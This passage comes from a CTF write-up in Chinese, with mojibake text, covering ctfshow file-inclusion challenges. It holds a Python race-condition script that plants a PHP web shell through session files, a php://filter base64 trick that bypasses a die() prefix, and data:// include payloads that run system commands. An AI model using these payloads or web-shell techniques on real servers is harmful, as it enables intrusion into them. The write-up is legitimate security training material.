</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="nx">def</span> <span class="nx">read</span><span class="p">(</span><span class="nx">session</span><span class="p">)</span><span class="o">:</span><span class="c1">#è®¿é—®/tmp/sess_ctfshowï¼Œpostä¼ é€’ä¿¡æ¯ï¼Œåœ¨ç½‘ç«™ç›®å½•ä¸‹å†™å…¥æœ¨é©¬ã€‚
</span></span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="c1"></span>	<span class="k">while</span> <span class="k">True</span><span class="o">:</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">		<span class="nx">response</span><span class="o">=</span><span class="nx">session</span><span class="o">.</span><span class="nx">post</span><span class="p">(</span><span class="nx">url</span><span class="o">+</span><span class="s1">&#39;?file=/tmp/sess_&#39;</span><span class="o">+</span><span class="nx">sessionid</span><span class="p">,</span><span class="nx">data</span><span class="o">=</span><span class="nx">data</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">			<span class="nx">cookies</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">			<span class="s1">&#39;PHPSESSID&#39;</span><span class="o">:</span><span class="nx">sessionid</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">			<span class="p">)</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">		<span class="nx">resposne2</span><span class="o">=</span><span class="nx">session</span><span class="o">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">url</span><span class="o">+</span><span class="s1">&#39;jiuzhen.php&#39;</span><span class="p">);</span><span class="c1">#è®¿é—®æœ¨é©¬æ–‡ä»¶ï¼Œå¦‚æœè®¿é—®åˆ°äº†å°±ä»£è¡¨ç«äº‰æˆåŠŸ
</span></span></span><span class="line"><span class="ln">34</span><span class="cl"><span class="c1"></span>		<span class="k">if</span> <span class="nx">resposne2</span><span class="o">.</span><span class="nx">status_code</span><span class="o">==</span><span class="mi">200</span><span class="o">:</span><span class="nx">äº†</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">			<span class="k">print</span><span class="p">(</span><span class="s1">&#39;++++++done++++++&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">		<span class="k">else</span><span class="o">:</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">			<span class="k">print</span><span class="p">(</span><span class="nx">resposne2</span><span class="o">.</span><span class="nx">status_code</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">
</span></span><span class="line"><span class="ln">39</span><span class="cl"><span class="k">if</span> <span class="nx">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">
</span></span><span class="line"><span class="ln">41</span><span class="cl">	<span class="nx">evnet</span><span class="o">=</span><span class="nx">threading</span><span class="o">.</span><span class="nx">Event</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">	<span class="c1">#å†™å…¥å’Œè®¿é—®åˆ†åˆ«è®¾ç½®5ä¸ªçº¿ç¨‹ã€‚
</span></span></span><span class="line"><span class="ln">43</span><span class="cl"><span class="c1"></span>	<span class="nx">with</span> <span class="nx">requests</span><span class="o">.</span><span class="nx">session</span><span class="p">()</span> <span class="k">as</span> <span class="nx">session</span><span class="o">:</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">		<span class="k">for</span> <span class="nx">i</span> <span class="nx">in</span> <span class="nx">range</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span><span class="o">:</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">			<span class="nx">threading</span><span class="o">.</span><span class="nx">Thread</span><span class="p">(</span><span class="nx">target</span><span class="o">=</span><span class="nx">write</span><span class="p">,</span><span class="nx">args</span><span class="o">=</span><span class="p">(</span><span class="nx">session</span><span class="p">,))</span><span class="o">.</span><span class="nx">start</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">		<span class="k">for</span> <span class="nx">i</span> <span class="nx">in</span> <span class="nx">range</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span><span class="o">:</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl">			<span class="nx">threading</span><span class="o">.</span><span class="nx">Thread</span><span class="p">(</span><span class="nx">target</span><span class="o">=</span><span class="nx">read</span><span class="p">,</span><span class="nx">args</span><span class="o">=</span><span class="p">(</span><span class="nx">session</span><span class="p">,))</span><span class="o">.</span><span class="nx">start</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl">
</span></span><span class="line"><span class="ln">49</span><span class="cl">	<span class="nx">evnet</span><span class="o">.</span><span class="nx">set</span><span class="p">()</span>
</span></span></code></pre></div><p><img alt="image-20241123014155194" loading="lazy" src="assets/image-20241123014155194.png"></p>
<p>getshell</p>
<p><img alt="image-20241123014312621" loading="lazy" src="assets/image-20241123014312621.png"></p>
<p>ç›´æ¥æŸ¥flag</p>
<p><strong>åˆ©ç”¨æ¡ä»¶</strong></p>
<blockquote>
<ol>
<li>å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´</li>
<li>çŸ¥é“sessionæ–‡ä»¶å­˜æ”¾è·¯å¾„ï¼Œå¯ä»¥å°è¯•é»˜è®¤è·¯å¾„</li>
<li>å…·æœ‰è¯»å–å’Œå†™å…¥sessionæ–‡ä»¶çš„æƒé™</li>
</ol></blockquote>
<p>è¿™ä¸¤ä¸ªè„šæœ¬ç†è®ºä¸Šé€‚ç”¨äº<code>web82-web86</code></p>
<h4 id="web83">web83<a hidden class="anchor" aria-hidden="true" href="#web83">#</a></h4>
<p>web83çš„å¼€ç¯‡è®¾ç½®äº†session_unset();session_destroy();</p>
<blockquote>
<p>session_unset()ï¼šé‡Šæ”¾å½“å‰åœ¨å†…å­˜ä¸­å·²ç»åˆ›å»ºçš„æ‰€æœ‰$_SESSIONå˜é‡ï¼Œä½†ä¸åˆ é™¤sessionæ–‡ä»¶ä»¥åŠä¸é‡Šæ”¾å¯¹åº”çš„ã€‚
session_destroy()ï¼šåˆ é™¤å½“å‰ç”¨æˆ·å¯¹åº”çš„sessionæ–‡ä»¶ä»¥åŠé‡Šæ”¾sessionidï¼Œå†…å­˜ä¸­çš„$_SESSIONå˜é‡å†…å®¹ä¾ç„¶ä¿ç•™ã€‚</p></blockquote>
<p>å°±æ˜¯é‡Šæ”¾å’Œæ¸…é™¤äº†å‰é¢æ‰€æœ‰sessionå˜é‡å’Œæ–‡ä»¶ï¼Œä½†æ˜¯æˆ‘ä»¬çš„è§£é¢˜æ€è·¯æ˜¯ç«äº‰ä¸Šä¼ é‚£ä¸€ç¬é—´åˆ›å»ºçš„sessionï¼Œæ‰€ä»¥ä¸å½±å“ã€‚</p>
<h4 id="web84">web84<a hidden class="anchor" aria-hidden="true" href="#web84">#</a></h4>
<p>åŠ ä¸Šäº†ä¸€ä¸ª<code>system(rm -rf /tmp/*);</code>ï¼Œä½†æ˜¯å› ä¸ºæœ¬æ¥session.upload_progress.cleanup = onï¼Œå°±ä¼šæ¸…ç©ºå¯¹åº”sessionæ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œè¿™é‡ŒåŠ ä¸Šåˆ é™¤ï¼Œå¯¹ç«äº‰çš„å½±å“ä¸å¤§ã€‚ï¼ˆä½†æ˜¯å¯èƒ½éœ€è¦å¢åŠ ä¸€äº›çº¿ç¨‹ï¼‰</p>
<h4 id="web85">web85<a hidden class="anchor" aria-hidden="true" href="#web85">#</a></h4>
<p>æ·»åŠ äº†ä¸€ä¸ªå†…å®¹è¯†åˆ«ï¼Œå¦‚æœæœ‰&lt;å°±dieï¼Œä¾æ—§å¯ä»¥ç«äº‰ã€‚</p>
<h4 id="web86">web86<a hidden class="anchor" aria-hidden="true" href="#web86">#</a></h4>
<p>dirname(<strong>FILE</strong>)è¡¨ç¤ºå½“å‰æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ã€‚set_include_pathå‡½æ•°,æ˜¯ç”¨æ¥è®¾ç½®includeçš„è·¯å¾„çš„ï¼Œå°±æ˜¯include()å¯ä»¥ä¸æä¾›æ–‡ä»¶çš„å®Œæ•´è·¯å¾„äº†ã€‚
includeæ–‡ä»¶æ—¶,å½“åŒ…å«è·¯å¾„æ—¢ä¸æ˜¯ç›¸å¯¹è·¯å¾„ï¼Œä¹Ÿä¸æ˜¯ç»å¯¹è·¯å¾„æ—¶(å¦‚:include(â€œtest.phpâ€))ï¼Œä¼šå…ˆæŸ¥æ‰¾include_pathæ‰€è®¾ç½®çš„ç›®å½•ã€‚
è„šæœ¬é‡Œç”¨çš„æ˜¯å®Œæ•´è·¯å¾„ï¼Œä¸å½±å“ç«äº‰ã€‚</p>
<blockquote>
<p>web82-86ï¼šå‚è€ƒhttps://blog.csdn.net/m0_48780534/article/details/125410757</p></blockquote>
<h4 id="web87">web87<a hidden class="anchor" aria-hidden="true" href="#web87">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-16 21:57:55
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;php&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;data&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">file_put_contents</span><span class="p">(</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$file</span><span class="p">),</span> <span class="s2">&#34;&lt;?php die(&#39;å¤§ä½¬åˆ«ç§€äº†&#39;);?&gt;&#34;</span><span class="o">.</span><span class="nv">$content</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl">    
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><blockquote>
<p>ä½¿ç”¨ <code>file_put_contents</code> å‡½æ•°å°†ç»è¿‡å¤„ç†åçš„å†…å®¹å†™å…¥åˆ°æ–‡ä»¶ä¸­ã€‚å†™å…¥çš„å†…å®¹æ˜¯å…ˆæ‹¼æ¥äº†ä¸€ä¸ª <code>&lt;?php die('å¤§ä½¬åˆ«ç§€äº†');?&gt;</code> å­—ç¬¦ä¸²,ç”¨äºåœ¨åç»­å¦‚æœæœ‰äººç›´æ¥è®¿é—®å†™å…¥åçš„æ–‡ä»¶æ—¶ï¼Œé˜²æ­¢æ–‡ä»¶å†…å®¹è¢«ç›´æ¥æ‰§è¡Œè€Œæ˜¾ç¤ºä¸€äº›æç¤ºä¿¡æ¯ï¼Œç„¶åå†æ‹¼æ¥ä¸Šä» <code>$_POST</code> ä¸­è·å–çš„ <code>$content</code> å˜é‡çš„å€¼ã€‚</p></blockquote>
<p>è¿™é“é¢˜éœ€è¦ç”¨åˆ°php://filter</p>
<h5 id="phpfilterçš„ä½¿ç”¨">php://filterçš„ä½¿ç”¨<a hidden class="anchor" aria-hidden="true" href="#phpfilterçš„ä½¿ç”¨">#</a></h5>
<p>åŸæ–‡ï¼š<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">è°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨ | ç¦»åˆ«æ­Œ</a></p>
<p>php://filterä¹‹å‰æœ€å¸¸å‡ºé•œçš„åœ°æ–¹æ˜¯XXEã€‚ç”±äºXXEæ¼æ´çš„ç‰¹æ®Šæ€§ï¼Œæˆ‘ä»¬åœ¨è¯»å–HTMLã€PHPç­‰æ–‡ä»¶æ—¶å¯èƒ½ä¼šæŠ›å‡ºæ­¤ç±»é”™è¯¯<code>parser error : StartTag: invalid element name</code> ã€‚å…¶åŸå› æ˜¯ï¼ŒPHPæ˜¯åŸºäºæ ‡ç­¾çš„è„šæœ¬è¯­è¨€ï¼Œ<code>&lt;?php ... ?&gt;</code>è¿™ä¸ªè¯­æ³•ä¹Ÿä¸XMLç›¸ç¬¦åˆï¼Œæ‰€ä»¥åœ¨è§£æXMLçš„æ—¶å€™ä¼šè¢«è¯¯è®¤ä¸ºæ˜¯XMLï¼Œè€Œå…¶ä¸­å†…å®¹ï¼ˆæ¯”å¦‚ç‰¹æ®Šå­—ç¬¦ï¼‰åˆæœ‰å¯èƒ½å’Œæ ‡å‡†XMLå†²çªï¼Œæ‰€ä»¥å¯¼è‡´äº†å‡ºé”™ã€‚</p>
<p>é‚£ä¹ˆï¼Œä¸ºäº†è¯»å–åŒ…å«æœ‰æ•æ„Ÿä¿¡æ¯çš„PHPç­‰æºæ–‡ä»¶ï¼Œæˆ‘ä»¬å°±è¦å…ˆå°†â€œå¯èƒ½å¼•å‘å†²çªçš„PHPä»£ç â€ç¼–ç ä¸€éï¼Œè¿™é‡Œå°±ä¼šç”¨åˆ°php://filterã€‚</p>
<p>php://filteræ˜¯PHPè¯­è¨€ä¸­ç‰¹æœ‰çš„åè®®æµï¼Œä½œç”¨æ˜¯ä½œä¸ºä¸€ä¸ªâ€œä¸­é—´æµâ€æ¥å¤„ç†å…¶ä»–æµã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å¦‚ä¸‹ä¸€è¡Œä»£ç å°†POSTå†…å®¹è½¬æ¢æˆbase64ç¼–ç å¹¶è¾“å‡ºï¼š</p>
<pre tabindex="0"><code>readfile(&#34;php://filter/read=convert.base64-encode/resource=php://input&#34;);
</code></pre><p>å¦‚ä¸‹ï¼š</p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201607/0f851469385893.png"><img alt="QQæˆªå›¾20160724234603.png" loading="lazy" src="assets/thum-0f851469385893.png"></a></p>
<p>æ‰€ä»¥ï¼Œåœ¨XXEä¸­ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å°†PHPç­‰å®¹æ˜“å¼•å‘å†²çªçš„æ–‡ä»¶æµç”¨php://filteråè®®æµå¤„ç†ä¸€éï¼Œè¿™æ ·å°±èƒ½æœ‰æ•ˆè§„é¿ç‰¹æ®Šå­—ç¬¦é€ æˆæ··ä¹±ã€‚</p>
<p>å¦‚ä¸‹ï¼Œæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯<code>php://filter/read=convert.base64-encode/resource=./xxe.php</code></p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201607/693b1469385893.png"><img alt="QQæˆªå›¾20160724235335.png" loading="lazy" src="assets/thum-693b1469385893.png"></a></p>
<hr>
<p>å›å½’æ­£é¢˜</p>
<p>æˆ‘ä»¬å®¡ä¸€ä¸‹è¿™é“é¢˜ç›®çš„ä»£ç </p>
<p>ç›¸æ¯”ä¸Šä¸€é“é¢˜è¿™é¢˜å¢åŠ äº†ä¸€ä¸ªpostå‚æ•°ï¼Œä¸”ä¼šå°†ä¼ å…¥çš„å‚æ•°è¿›è¡Œæ‹¼æ¥åå†™å…¥æ–‡ä»¶</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"> <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl"> <span class="nx">file_put_contents</span><span class="p">(</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$file</span><span class="p">),</span> <span class="s2">&#34;&lt;?php die(&#39;å¤§ä½¬åˆ«ç§€äº†&#39;);?&gt;&#34;</span><span class="o">.</span><span class="nv">$content</span><span class="p">);</span>
</span></span></code></pre></div><p>è¿™é“é¢˜åœ¨<code>$content</code>å’Œ<code>$file</code>ä¹‹é—´æ‹¼æ¥äº†ä¸€ä¸ª<?php die('å¤§ä½¬åˆ«ç§€äº†');?>ï¼Œå¯¼è‡´å³ä½¿æˆ‘ä»¬æˆåŠŸå†™å…¥ä¸€å¥è¯ï¼Œä¹Ÿæ‰§è¡Œä¸äº†</p>
<p>æˆ‘ä»¬å¦‚ä½•ç»•è¿‡è¿™ä¸ªdieå‘¢ï¼Ÿ</p>
<p>å…¶å®æˆ‘ä»¬å¯ä»¥é€šè¿‡php://filteræµçš„base64-decodeæ–¹æ³•æ¥å»é™¤è¿™ä¸ªdie</p>
<p>å› ä¸ºphpåœ¨è§£ç base64ç¼–ç çš„æ—¶å€™ä¼šå…ˆå°†ä¸å±äºbase64ä¸­çš„å­—ç¬¦å»é™¤ï¼Œå†è¿›è¡Œè½¬æ¢ï¼Œå¦‚ä¸‹</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;txt&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;|[^a-z0-9A-Z+/]|s&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;txt&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;txt&#39;</span><span class="p">]);</span>
</span></span></code></pre></div><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ php://filter/write=convert.base64-decode æ¥é¦–å…ˆå¯¹å…¶è§£ç ã€‚åœ¨è§£ç çš„è¿‡ç¨‹ä¸­ï¼Œå­—ç¬¦&lt;ã€?ã€;ã€&gt;ã€ã€(ã€) ã€&lsquo;ç©ºæ ¼ç­‰å­—ç¬¦ä¸ç¬¦åˆbase64ç¼–ç çš„å­—ç¬¦èŒƒå›´å°†è¢«å¿½ç•¥ï¼Œæ‰€ä»¥æœ€ç»ˆè¢«è§£ç çš„å­—ç¬¦ä»…æœ‰â€œphpdieâ€å’Œæˆ‘ä»¬ä¼ å…¥çš„å…¶ä»–å­—ç¬¦ã€‚</p>
<p><code>â€phpdieâ€œ</code>ä¸€å…±6ä¸ªå­—ç¬¦ï¼Œç”±äºbase64ç®—æ³•è§£ç æ—¶æ˜¯4ä¸ªbyteä¸€ç»„ï¼Œæ‰€ä»¥ç»™ä»–å¢åŠ 2ä¸ªâ€œaâ€ä¸€å…±8ä¸ªå­—ç¬¦ã€‚è¿™æ ·ï¼Œ&ldquo;phpdie&quot;è¢«æ­£å¸¸è§£ç ï¼Œè€Œåé¢æˆ‘ä»¬ä¼ å…¥çš„webshellçš„base64å†…å®¹ä¹Ÿè¢«æ­£å¸¸è§£ç ã€‚</p>
<p>åŒæ—¶ç”±äºä¼šå¯¹ä¼ å…¥çš„fileè¿›è¡Œurlè§£ç ï¼Œæ‰€ä»¥éœ€è¦å¯¹ä¼ å…¥çš„fileè¿›è¡Œä¸¤æ¬¡urlç¼–ç </p>
<blockquote>
<p>warning!!!urlç¼–ç éœ€è¦è¿åŒè‹±æ–‡å­—ç¬¦ä¸€èµ·è¿›è¡Œè½¬æ¢ï¼Œå¯ä»¥å€ŸåŠ©hackbarå¼ºåˆ¶è¿›è¡Œè½¬æ¢ï¼ˆæ‰¾äº†å¾ˆä¹…ï¼‰</p></blockquote>
<p>poc:</p>
<pre tabindex="0"><code>åŸæ–‡ï¼šfile=php://filter/write=convert.base64-decode/resource=shell.php

file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30
</code></pre><pre tabindex="0"><code>åŸæ–‡ï¼šcontent=&lt;?php system(&#39;cat fl0g.php&#39;);?&gt;

content=aaPD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTs/Pg==
</code></pre><p>è®¿é—®shell.php,å¾—åˆ°flag</p>
<p>å…¶å®è¿˜å¯ä»¥é€šè¿‡å…¶ä»–ç¼–ç æ¥è¿›è¡Œç»•è¿‡å¦‚rot13</p>
<p>æ›´å¤š<a href="https://xz.aliyun.com/t/8163?time__1311=n4%2BxnD0Dc7GQ0%3DDCDgADlhjm57IKvq0Ivo%2BimK%3Dx#toc-3">file_put_contentå’Œæ­»äº¡Â·æ‚ç³…ä»£ç ä¹‹ç¼˜ - å…ˆçŸ¥ç¤¾åŒº</a></p>
<h4 id="web88">web88<a hidden class="anchor" aria-hidden="true" href="#web88">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-17 02:27:25
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/php|\~|\!|\@|\#|</span><span class="se">\\</span><span class="s2">$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;error&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿™é¢˜è¿‡æ»¤äº†å¾ˆå¤šå­—ç¬¦ä½†æ˜¯æ²¡æœ‰è¿‡æ»¤:ã€/ã€;</p>
<p>poc</p>
<pre tabindex="0"><code>?file=data://text/plain;base64,PD89c3lzdGVtKCJ0YWMgZmwwZy5waHAiKTsgPz4
</code></pre><h4 id="web116">web116<a hidden class="anchor" aria-hidden="true" href="#web116">#</a></h4>
<p>æ‹¿åˆ°é¢˜ç›®ç¯å¢ƒï¼Œå‘ç°æ˜¯ä¸ªè§†é¢‘ï¼Œä¸‹è½½è§†é¢‘ç”¨binwalkæ‰«ä¸€ä¸‹</p>
<p><img alt="image-20250107142748584" loading="lazy" src="./assets/image-20250107142748584.png"></p>
<p>æå–å›¾ç‰‡ï¼Œå‘ç°æ˜¯æºç </p>
<p><img alt="image-20250107142550734" loading="lazy" src="./assets/image-20250107142550734.png"></p>
<p>ç›´æ¥getä¼ å‚è¯»flag</p>
<pre tabindex="0"><code>?file=flag.php
</code></pre><p><img alt="image-20250107143725806" loading="lazy" src="./assets/image-20250107143725806.png"></p>
<h4 id="web117">web117<a hidden class="anchor" aria-hidden="true" href="#web117">#</a></h4>
<p>web87çš„åç»­ æ­»äº¡ç»•è¿‡</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: yu22x
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-01 18:16:59
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$x</span><span class="p">){</span>
